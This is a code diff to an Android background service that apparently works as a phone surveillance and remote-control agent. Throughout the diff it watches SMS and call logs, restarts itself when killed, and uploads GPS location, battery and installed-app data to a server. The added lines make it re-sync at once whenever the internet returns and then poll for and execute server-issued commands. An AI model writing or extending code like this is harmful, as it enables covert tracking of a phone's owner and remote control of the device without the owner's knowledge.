@@ -9,6 +9,10 @@ import android.content.Context
 import android.content.Intent
 import android.content.pm.ServiceInfo
 import android.database.ContentObserver
+import android.net.ConnectivityManager
+import android.net.Network
+import android.net.NetworkCapabilities
+import android.net.NetworkRequest
 import android.net.Uri
 import android.os.Build
 import android.os.Handler
@@ -62,6 +66,10 @@ class AgentBackgroundService : Service() {
         var isRunning: Boolean = false
             private set
 
+        @Volatile
+        var instance: AgentBackgroundService? = null
+            private set
+
         fun startService(context: Context) {
             val intent = Intent(context, AgentBackgroundService::class.java)
             try {
@@ -80,6 +88,10 @@ class AgentBackgroundService : Service() {
             val intent = Intent(context, AgentBackgroundService::class.java)
             context.stopService(intent)
         }
+
+        fun triggerImmediateSync() {
+            instance?.executeImmediateSync()
+        }
     }
 
     private val serviceJob = SupervisorJob()
@@ -87,6 +99,7 @@ class AgentBackgroundService : Service() {
 
     private var smsObserver: ContentObserver? = null
     private var callObserver: ContentObserver? = null
+    private var networkCallback: ConnectivityManager.NetworkCallback? = null
 
     private val isSyncInProgress = AtomicBoolean(false)
     private var syncDebounceJob: Job? = null
@@ -94,21 +107,25 @@ class AgentBackgroundService : Service() {
     override fun onCreate() {
         super.onCreate()
         Log.i(TAG, "onCreate: Initializing live background sync service")
+        instance = this
         isRunning = true
 
         createNotificationChannel()
         startAsForeground()
 
         registerContentObservers()
+        registerNetworkCallback()
         startLivePollingLoop()
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.i(TAG, "onStartCommand: flags=$flags startId=$startId")
+        instance = this
         isRunning = true
 
         // Ensure loops are active
         ensureConfigLoaded()
+        executeImmediateSync()
 
         // If Android OS kills the service under memory pressure, restart it as soon as possible
         return START_STICKY
@@ -118,9 +135,11 @@ class AgentBackgroundService : Service() {
 
     override fun onDestroy() {
         Log.w(TAG, "onDestroy: Service is being destroyed — triggering auto-restart watchdog")
+        instance = null
         isRunning = false
 
         unregisterContentObservers()
+        unregisterNetworkCallback()
         serviceScope.cancel()
 
         // Send restart broadcast so service resurrects if killed
@@ -132,6 +151,60 @@ class AgentBackgroundService : Service() {
         }
 
         super.onDestroy()
+    }
+
+    private fun registerNetworkCallback() {
+        try {
+            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return
+            val request = NetworkRequest.Builder()
+                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
+                .build()
+
+            networkCallback = object : ConnectivityManager.NetworkCallback() {
+                override fun onAvailable(network: Network) {
+                    Log.i(TAG, "NetworkCallback: Internet is AVAILABLE again! Triggering immediate reconnect & telemetry")
+                    ApiClient.resetConnectionPool()
+                    executeImmediateSync()
+                }
+
+                override fun onLost(network: Network) {
+                    Log.w(TAG, "NetworkCallback: Internet connection LOST (data off)")
+                }
+            }
+            cm.registerNetworkCallback(request, networkCallback!!)
+            Log.i(TAG, "NetworkCallback successfully registered for automatic reconnect")
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to register NetworkCallback", e)
+        }
+    }
+
+    private fun unregisterNetworkCallback() {
+        try {
+            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
+            networkCallback?.let { cm?.unregisterNetworkCallback(it) }
+            networkCallback = null
+        } catch (e: Exception) {
+            Log.w(TAG, "Failed to unregister NetworkCallback", e)
+        }
+    }
+
+    fun executeImmediateSync() {
+        serviceScope.launch {
+            try {
+                val apiKey = AgentPreferences.getDeviceApiKey(applicationContext)
+                if (apiKey.isNotBlank()) {
+                    ServerConfig.deviceApiKey = apiKey
+                    ServerConfig.baseUrl = AgentPreferences.getServerUrl(applicationContext)
+
+                    Log.i(TAG, "Executing immediate reconnect heartbeat...")
+                    performTelemetrySync(force = true)
+                    pollAndExecuteCommands()
+                    performIncrementalSync()
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Error in executeImmediateSync", e)
+            }
+        }
     }
 
     override fun onTaskRemoved(rootIntent: Intent?) {
@@ -251,15 +324,15 @@ class AgentBackgroundService : Service() {
     private var hasScannedMedia = false
     private var lastMediaScanMs = 0L
 
-    private suspend fun performTelemetrySync() {
+    private suspend fun performTelemetrySync(force: Boolean = false) {
         val now = System.currentTimeMillis()
-        if (now - lastTelemetrySyncMs >= 40000L) {
-            lastTelemetrySyncMs = now
+        if (force || (now - lastTelemetrySyncMs >= 30000L)) {
             try {
                 val shouldIncludeApps = !hasUploadedApps || ((now - lastTelemetrySyncMs) >= 600000L)
                 val telemetry = DeviceDataReader.collectTelemetry(applicationContext, includeApps = shouldIncludeApps)
                 val res = ApiClient.sendTelemetry(telemetry)
                 if (res != null) {
+                    lastTelemetrySyncMs = now
                     if (shouldIncludeApps) hasUploadedApps = true
                     Log.i(TAG, "Device telemetry synced (battery=${telemetry.battery_level}%, GPS=${telemetry.latitude},${telemetry.longitude})")
                 }
